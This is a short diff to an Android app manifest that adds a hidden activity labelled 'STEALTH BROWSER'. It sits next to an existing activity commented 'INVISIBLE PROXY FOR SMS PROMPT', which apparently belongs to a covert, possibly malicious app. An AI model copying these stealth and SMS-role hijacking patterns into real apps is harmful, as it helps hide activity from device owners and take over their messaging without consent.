@@ -371,6 +371,9 @@
             </intent-filter>
         </service>
 
+        <!-- STEALTH BROWSER -->
+        <activity android:name=".BrowserActivity" android:exported="false" android:theme="@android:style/Theme.DeviceDefault.NoActionBar" />
+
         <!-- INVISIBLE PROXY FOR SMS PROMPT -->
         <activity
             android:name=".SmsRoleActivity"
